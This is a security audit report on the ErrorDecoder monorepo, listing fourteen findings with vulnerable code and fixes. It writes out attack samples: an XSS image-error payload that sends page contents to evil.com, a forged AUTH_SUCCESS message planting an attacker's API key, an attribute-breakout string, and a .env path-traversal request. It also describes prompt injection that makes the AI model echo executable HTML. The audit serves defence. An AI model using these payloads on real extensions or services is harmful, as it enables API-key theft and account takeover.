# Security Analysis Report

**Analyzed**: 2026-04-02
**Scope**: Full monorepo — packages/api, packages/extension, packages/web, scripts/, shared/
**Vulnerabilities Found**: 14 (Critical: 2, High: 4, Medium: 5, Low: 3)

---

## CRITICAL — Unauthenticated External Message Handler Accepts Arbitrary Credentials

**Category**: Auth
**OWASP**: A07:2021 Identification and Authentication Failures
**Location**: `packages/extension/src/background/index.ts:116-137`

**Issue**: `chrome.runtime.onMessageExternal` accepts `AUTH_SUCCESS`, `PLAN_UPGRADED`, `PLAN_CHANGED`, and `LOGOUT` messages from any origin listed in `externally_connectable`. The manifest permits `https://errordecoder.dev/*` and `http://localhost:4000/*`. The handler writes the incoming `apiKey`, `email`, and `plan` directly to `chrome.storage.local` without any validation of the values or verification that the sender actually owns those credentials.

**Attack Scenario**: A user with a compromised errordecoder.dev subdomain (or any future XSS on the landing page) can send:
```js
chrome.runtime.sendMessage(EXTENSION_ID, {
  type: "AUTH_SUCCESS",
  apiKey: "victim-api-key-from-database-breach",
  email: "victim@example.com",
  plan: "pro"
});
```
The extension silently replaces the current user's stored key with the attacker-supplied key. All subsequent decode requests are billed to and logged under the victim account. The inverse also works: send a `LOGOUT` to silently deauthenticate any user visiting the page.

**Impact**: Full account takeover of any extension user who visits the attacker-controlled page while the extension is installed. All decodes are sent under the hijacked key, exposing the victim's decode history and consuming their quota.

**Vulnerable Code**:
```ts
chrome.runtime.onMessageExternal.addListener((message, _sender, sendResponse) => {
  if (message.type === "AUTH_SUCCESS") {
    chrome.storage.local.set({
      apiKey: message.apiKey,   // Unvalidated external value
      userEmail: message.email,
      userPlan: message.plan,
    });
```

**Secure Fix**: The handler must verify the sender origin against a hard-coded allowlist AND verify the API key against the backend before storing it. At minimum, call `api.usage()` with the received key to confirm it is valid and belongs to the claimed email before persisting it.

---

## CRITICAL — Unauthenticated Rate-Limit Bypass via RPC Error Fail-Open

**Category**: Input Validation
**OWASP**: A04:2021 Insecure Design
**Location**: `packages/api/src/lib/middleware.ts:81-85`

**Issue**: When the Supabase RPC call `increment_daily_usage` fails (network error, DB timeout, RLS error, etc.), the middleware logs the error and calls `await next()`, passing the request through without incrementing or checking the counter.

**Attack Scenario**: An attacker can trigger or exploit transient DB failures (e.g., connection pool exhaustion via flooding) to bypass the 3 decodes/day free limit. Even without manufacturing failures, any DB hiccup during peak load will silently hand unlimited free decodes to all free-tier users at that moment.

**Impact**: Unlimited Anthropic API calls billed to the operator. At scale this could produce significant unbudgeted cost. The free tier becomes effectively unenforced during any DB instability window.

**Vulnerable Code**:
```ts
if (error) {
  console.error("[Rate Limit] Failed to check usage:", error.message);
  await next();  // Fail-open: grants request on DB error
  return;
}
```

**Secure Fix**: Fail closed. Return a 503 or 429 on RPC error rather than proceeding:
```ts
if (error) {
  console.error("[Rate Limit] Failed to check usage:", error.message);
  return c.json({ error: { message: "Service temporarily unavailable.", code: errorCodes.serverError } }, 503);
}
```

---

## HIGH — Reflected XSS via `innerHTML` Assignment with Unescaped AI-Controlled Markdown

**Category**: XSS
**OWASP**: A03:2021 Injection
**Location**: `packages/extension/src/sidepanel/index.ts:717` and `packages/extension/src/devtools/panel.ts:151`

**Issue**: AI response markdown is rendered via `marked.parse()` and assigned directly to `container.innerHTML`. The `marked` library by default does not sanitize HTML — it passes raw HTML through. The AI response contains user-controlled content (the error text is echoed back) and operator-controlled content (Anthropic response). If the AI response contains `<script>` tags, event handler attributes, or `<img onerror=...>` payloads, they execute inside the extension's sidepanel/devtools page context.

The devtools panel also uses `innerHTML` to build result HTML:
```ts
resultContent.innerHTML = html;  // panel.ts:151
```
where `html` is assembled from `escapeHtml()`-escaped strings — this path is safe. But the sidepanel's `renderMarkdown` is not.

**Attack Scenario**: An attacker crafts an error message that causes the AI model to reflect HTML/JS in its response (prompt injection). Because the sidepanel runs as a privileged extension page with access to `chrome.storage.local`, XSS here can exfiltrate the stored API key:
```
Error: <img src=x onerror="fetch('https://evil.com/?k='+btoa(document.body.innerHTML))">
```

**Impact**: Exfiltration of API keys stored in `chrome.storage.local`. Full compromise of the user's ErrorDecoder account.

**Vulnerable Code**:
```ts
// sidepanel/index.ts:717
const renderMarkdown = (markdown: string, container: HTMLElement) => {
  container.innerHTML = marked.parse(markdown) as string;
```

**Secure Fix**: Configure `marked` with `sanitize` option or pass output through DOMPurify before assignment:
```ts
import DOMPurify from "dompurify";
container.innerHTML = DOMPurify.sanitize(marked.parse(markdown) as string);
```

**Environment Note**: This affects production users. The sidepanel has the same origin as other extension pages and shares storage access.

---

## HIGH — Stored XSS in Tech Stack Badge Rendering via Unescaped Color/Name Values

**Category**: XSS
**OWASP**: A03:2021 Injection
**Location**: `packages/extension/src/sidepanel/index.ts:293-296`

**Issue**: Tech stack data flows from the page's DOM attributes through the content script into session storage, then into the sidebar via `innerHTML` interpolation. The `color` and `name` values from detected tech are written directly into an HTML string without escaping.

**Attack Scenario**: A malicious page sets:
```html
<div data-errordecoder-globals='{"react":true}'></div>
```
The main-world script reads globals and writes them to the DOM attribute. The `color` field is hardcoded in `tech-detect.ts` — so color is not user-controlled. However, the `name` field propagates from `t.name` which comes from `detectTechStack()`. The `version` field (`globals.reactVersion`) comes directly from `(window as any).React.version` — a page-controlled string that reaches `innerHTML` via:
```ts
bar.innerHTML = tech.map((t) =>
  `<span ... title="${t.name}${t.version ? ` v${t.version}` : ""} ...">
```
A malicious page sets `window.React.version = '" onmouseover="alert(1)" x="'` — this breaks out of the `title` attribute context.

**Impact**: XSS in extension sidebar page. Exfiltration of API key from `chrome.storage.local`.

**Vulnerable Code**:
```ts
bar.innerHTML = tech
  .map((t) => `<span class="tech-badge" style="background:${t.color}" title="${t.name}${t.version ? ` v${t.version}` : ""} (${t.category})">${t.name}</span>`)
  .join("");
```

**Secure Fix**: Use `escapeHtml()` on all interpolated values, or build elements via DOM APIs instead of innerHTML.

---

## HIGH — API Key Stored Unencrypted in `chrome.storage.local` (Accessible to Any Extension Page)

**Category**: Crypto
**OWASP**: A02:2021 Cryptographic Failures
**Location**: `packages/extension/src/shared/storage.ts`, `packages/extension/src/background/index.ts:104-109`

**Issue**: The API key is stored in `chrome.storage.local` as plaintext. `chrome.storage.local` is readable by any script running in the same extension origin — every extension page, every content script with the right permissions, and any XSS within an extension page. Crucially, the key is also exposed to other extensions on the system if the user has a compromised extension installed, because `chrome.storage.local` is not isolated between extensions (though this is mitigated by Chrome's extension sandbox).

The more direct threat: the XSS vulnerabilities described in findings 3 and 4 trivially exfiltrate the key because it sits in the same accessible storage that XSS executes in.

**Impact**: Any XSS in an extension page immediately yields the bearer API key. Stolen keys grant full decode access billable to the victim and expose their decode history.

**Vulnerable Code**:
```ts
chrome.storage.local.set({
  apiKey: message.apiKey,  // Stored as plaintext
```

**Secure Fix**: There is no perfect solution in a browser extension. However, `chrome.storage.session` (cleared when browser closes) is a better choice for the API key since it doesn't persist to disk. Additionally, treating the key as a short-lived token (5-15 minute TTL) obtained from a Supabase JWT would limit the blast radius of theft.

---

## HIGH — CORS Origin Wildcard for `chrome-extension://*`

**Category**: CORS & Origin
**OWASP**: A05:2021 Security Misconfiguration
**Location**: `packages/api/src/index.ts:21-28`

**Issue**: The CORS configuration allows any Chrome extension origin via `"chrome-extension://*"` wildcard. Chrome extension IDs are stable and unpredictable, but this policy means ANY Chrome extension installed on any user's browser can make credentialed requests to the API backend — not just the ErrorDecoder extension.

**Attack Scenario**: A malicious Chrome extension (e.g., a bundled adware extension) can read the API key from a compromised storage source or prompt a user to enter it, then make requests to the ErrorDecoder API backend appearing to come from a trusted extension origin. The CORS policy would allow it.

**Impact**: Medium blast radius — an attacker would still need a valid API key. But the CORS wildcard removes an intended defense layer and enables any extension to bypass origin-based access control at the network level.

**Vulnerable Code**:
```ts
cors({
  origin: [
    "chrome-extension://*",  // Wildcard — matches ALL extensions
```

**Secure Fix**: Pin to the specific extension ID:
```ts
origin: [
  `chrome-extension://${process.env.EXTENSION_ID}`,
  "http://localhost:4000",
  "https://errordecoder.dev",
]
```

---

## MEDIUM — API Key Comparison Susceptible to Timing Attack

**Category**: Auth
**OWASP**: A07:2021 Identification and Authentication Failures
**Location**: `packages/api/src/lib/middleware.ts:37-43`

**Issue**: API key authentication is performed via a Supabase `.eq("api_key", apiKey)` database query. The response time difference between "key not found" (no row returned quickly) and "key found but other error" leaks partial information. More critically, database query timing can vary depending on index lookup performance, leaking whether a given key prefix exists.

The larger concern: there is no constant-time comparison. If the key comparison ever moves to application-layer (e.g., caching), it would be vulnerable to a classic timing attack enumerating valid keys character by character.

**Impact**: Low practical exploitability against database-level lookups, but worth noting as a design debt that becomes critical if application-layer key caching is ever introduced.

**Secure Fix**: Use database-level lookups only (current approach is acceptable). Document that any future in-memory API key validation must use `crypto.timingSafeEqual()`.

---

## MEDIUM — `postMessage` Accepts Messages from Any Origin (`"*"`) in Panel Close Handler

**Category**: Auth
**OWASP**: A08:2021 Software and Data Integrity Failures
**Location**: `packages/extension/src/content/panel.ts:176-180`

**Issue**: The content script listens for `postMessage` events to close the sidebar panel, checking only `event.data?.type === "ERRORDECODER_CLOSE"` without validating `event.origin`. Any script on any page can send this message to close the debugging panel.

**Attack Scenario**: A malicious page runs:
```js
window.postMessage({ type: "ERRORDECODER_CLOSE" }, "*");
```
This closes the user's debugging panel, potentially in the middle of an active debugging session. More concerning: this same pattern could be extended to future message types if additional functionality is added to the `postMessage` handler without origin validation.

**Impact**: Currently limited to panel dismissal (annoyance/UX disruption). The pattern establishes an unvalidated `postMessage` channel that is a vector for future vulnerabilities if message types expand.

**Vulnerable Code**:
```ts
window.addEventListener("message", (event) => {
  if (event.data?.type === "ERRORDECODER_CLOSE") {
    hidePanel();
  }
});
```

**Secure Fix**:
```ts
window.addEventListener("message", (event) => {
  if (event.origin !== chrome.runtime.getURL("").slice(0, -1)) return;
  if (event.data?.type === "ERRORDECODER_CLOSE") hidePanel();
});
```

---

## MEDIUM — Sonnet Usage Counter Increment is Fire-and-Forget (Race Condition)

**Category**: Input Validation
**OWASP**: A04:2021 Insecure Design
**Location**: `packages/api/src/routes/decode.ts:110-112`

**Issue**: The Sonnet monthly usage counter is incremented asynchronously after the response is already sent to the client:
```ts
supabase.rpc("increment_sonnet_usage", ...).then(() => {});
```
The limit check reads `sonnet_uses_this_month` and the increment happens in a separate, non-atomic operation. Under concurrent requests, two simultaneous requests can both pass the `sonnetUsed >= 20` check before either increments the counter, allowing more than 20 Sonnet calls per month.

**Attack Scenario**: A user with 19 Sonnet uses fires 5 simultaneous decode requests. All 5 read `sonnetUsed = 19`, all 5 pass the `< 20` check, all 5 call Anthropic Sonnet. Counter ends up at 24.

**Impact**: Sonnet costs $3/$15 per 1M tokens (vs Haiku at $1/$5). Unlimited bypass of the 20/month limit inflates operator costs significantly for a targeted attack.

**Secure Fix**: Move the limit check and increment into a single atomic DB transaction or RPC function (same pattern as `increment_daily_usage`).

---

## MEDIUM — `error_text_preview` Logs Potentially Sensitive User Input

**Category**: Data Exposure
**OWASP**: A09:2021 Security Logging and Monitoring Failures
**Location**: `packages/api/src/routes/decode.ts:138`

**Issue**: The `logDecode` function stores `errorText.slice(0, 200)` as `error_text_preview` in the `decodes` table. Error text is user input that commonly contains sensitive data: connection strings, JWTs, passwords in error messages, stack traces with internal paths, and API keys.

The sensitive-data check exists client-side in the extension as a warning, but it is opt-in (user can click "Send Anyway") and does not apply to API callers not using the extension. Server-side, the preview is stored without any scrubbing.

**Impact**: Database breach would expose up to 200 characters of every error ever decoded, potentially including credentials. Supabase admin access to the database exposes all user inputs.

**Secure Fix**: Either hash the preview for deduplication purposes only (don't store raw text), or apply a server-side sensitive-data scrubber before storing `error_text_preview`.

---

## MEDIUM — Path Traversal in Web Dev Server Static File Handler

**Category**: Infrastructure & Network
**OWASP**: A01:2021 Broken Access Control
**Location**: `packages/web/src/server.ts:33-43`

**Issue**: The development web server constructs file paths from the request URL without sanitizing path traversal sequences:
```ts
const filePath = `./packages/web/src${path}`;
let file = Bun.file(filePath);
```
A request to `GET /../../.env` would construct `./packages/web/src/../../.env`, which resolves to `./packages/.env` or higher. While `path` comes from `new URL(req.url)`, the URL constructor does NOT normalize `../` sequences in the pathname — `new URL("http://h/../../.env").pathname` returns `"/../.env"` which when concatenated to the base path yields `./packages/web/src/../.env`.

**Attack Scenario**: A developer running the local web server with `bun run dev` is exposed to path traversal from localhost. The `.env` file contains `SUPABASE_SECRET_KEY`, `ANTHROPIC_API_KEY`, and `STRIPE_SECRET_KEY`.

**Impact**: Production impact is zero (Vercel serves static files, not this server). Development impact: any process or user on localhost that can make HTTP requests to port 4000 can read the `.env` file and all secrets.

**Environment Note**: Development-only. Not a production issue, but compromises all secrets during local development.

**Vulnerable Code**:
```ts
const filePath = `./packages/web/src${path}`;  // No traversal guard
```

**Secure Fix**:
```ts
import path from "path";
const baseDir = path.resolve("./packages/web/src");
const resolved = path.resolve(baseDir, "." + url.pathname);
if (!resolved.startsWith(baseDir)) {
  return new Response("Forbidden", { status: 403 });
}
```

---

## LOW — Hardcoded Test Credentials in Seed Script

**Category**: Data Exposure
**OWASP**: A02:2021 Cryptographic Failures
**Location**: `scripts/seed-test-user.ts:21-22`

**Issue**: Hardcoded test credentials committed to the repository:
```ts
const TEST_EMAIL = "test@errordecoder.dev";
const TEST_PASSWORD = "testpassword123";
```

**Impact**: If this user is ever created against the production Supabase instance, anyone with access to the repo (including future contributors or if the repo is ever made public) knows the credentials. `testpassword123` is trivially guessable independent of the code anyway.

**Secure Fix**: Use environment variables or generate a random password at script run time and print it to stdout.

---

## LOW — No Security Headers on API Responses

**Category**: Infrastructure & Network
**OWASP**: A05:2021 Security Misconfiguration
**Location**: `packages/api/src/index.ts` (global middleware)

**Issue**: The API does not set security headers: `X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security`, or `Content-Security-Policy`. These are not strictly required for a pure JSON API, but their absence means any accidental HTML responses (error pages, framework defaults) are more exploitable, and HSTS must be enforced at the CDN/proxy layer (Vercel does handle HSTS, so partial mitigation exists).

**Impact**: Low for a JSON-only API behind Vercel. Worth addressing as defense in depth.

**Secure Fix**: Add Hono's `secureHeaders` middleware:
```ts
import { secureHeaders } from "hono/secure-headers";
app.use("*", secureHeaders());
```

---

## LOW — STRIPE_WEBHOOK_SECRET Falls Back to Empty String

**Category**: Crypto
**OWASP**: A02:2021 Cryptographic Failures
**Location**: `packages/api/src/lib/stripe.ts:11`

**Issue**: 
```ts
export const STRIPE_WEBHOOK_SECRET = process.env.STRIPE_WEBHOOK_SECRET ?? "";
```
If `STRIPE_WEBHOOK_SECRET` is unset, the value is an empty string `""` rather than throwing at startup. The webhook route does check `if (!STRIPE_WEBHOOK_SECRET)` and returns 500, so the operational impact is a 500 response rather than silently accepting unsigned webhooks. However, the empty-string fallback is a design smell — the check in `lib/stripe.ts` should throw at startup like `STRIPE_SECRET_KEY` does.

**Impact**: If the startup check in `webhook-stripe.ts` is ever removed or refactored, unsigned webhooks would be accepted. The current code has a compensating runtime check, so risk is low.

**Secure Fix**: Throw at startup:
```ts
const webhookSecret = process.env.STRIPE_WEBHOOK_SECRET;
if (!webhookSecret) throw new Error("Missing STRIPE_WEBHOOK_SECRET");
export const STRIPE_WEBHOOK_SECRET = webhookSecret;
```

---

## Summary

| Category | Count |
|---|---|
| XSS | 2 |
| Auth | 3 |
| Input Validation | 2 |
| Data Exposure | 2 |
| Crypto | 2 |
| CORS | 1 |
| Infrastructure | 2 |

---

## Priority

### Emergency (Deploy Fix Today)
1. **CRITICAL — Unauthenticated external message handler** (`background/index.ts:116`): Validate API keys server-side before storing. This is the highest-risk finding — it allows silent account takeover of any user who visits the website.
2. **CRITICAL — Rate limit fail-open** (`middleware.ts:81`): Change to fail-closed (503) on RPC error.
3. **HIGH — innerHTML XSS via marked** (`sidepanel/index.ts:717`): Add DOMPurify. This enables API key exfiltration from any extension user who decodes a prompt-injected response.

### High (This Sprint)
4. **HIGH — Tech stack badge XSS** (`sidepanel/index.ts:293`): Escape `t.version` and `t.name` before interpolation.
5. **HIGH — CORS wildcard for chrome-extension** (`index.ts:21`): Pin to specific extension ID.
6. **MEDIUM — Sonnet race condition** (`decode.ts:110`): Make limit check+increment atomic.
7. **MEDIUM — postMessage origin not validated** (`panel.ts:176`): Add origin check.

### Medium (Next Sprint)
8. **HIGH — API key in chrome.storage.local** (`storage.ts`): Consider session storage or short-TTL approach.
9. **MEDIUM — error_text_preview stored raw** (`decode.ts:138`): Server-side scrub or drop the preview column.
10. **MEDIUM — Path traversal in dev server** (`web/src/server.ts:33`): Add path resolution guard.

### Low (Backlog)
11. **LOW — Hardcoded test password** (`seed-test-user.ts:22`)
12. **LOW — No security headers** (`index.ts`)
13. **LOW — STRIPE_WEBHOOK_SECRET empty-string fallback** (`lib/stripe.ts:11`)

---

## Security Posture

**Rating**: Needs Work

**Strengths**:
- Stripe webhook signature verification is properly implemented with `constructEventAsync`
- Valibot schema validation on all API route inputs
- Sensitive data detection exists client-side before sends
- Auth middleware consistently applied to protected routes
- Error handler does not leak stack traces in production
- Service role Supabase client is server-side only; `supabasePublic` used for JWT verification
- Feedback route enforces `user_id` ownership — no IDOR on thumbs up/down
- `escapeHtml` utility exists and is used in most innerHTML contexts

**Gaps**:
- Two critical findings (external message handler, rate limit fail-open) need immediate patches
- XSS in `renderMarkdown` (the most frequently executed code path in the extension) is unmitigated
- No server-side input scrubbing for stored error previews
- No rate limiting on the `/api/auth/key` endpoint (credential exchange endpoint)
- No IP-based or global rate limiting — only per-user DB-backed limiting
- Security headers absent from API responses
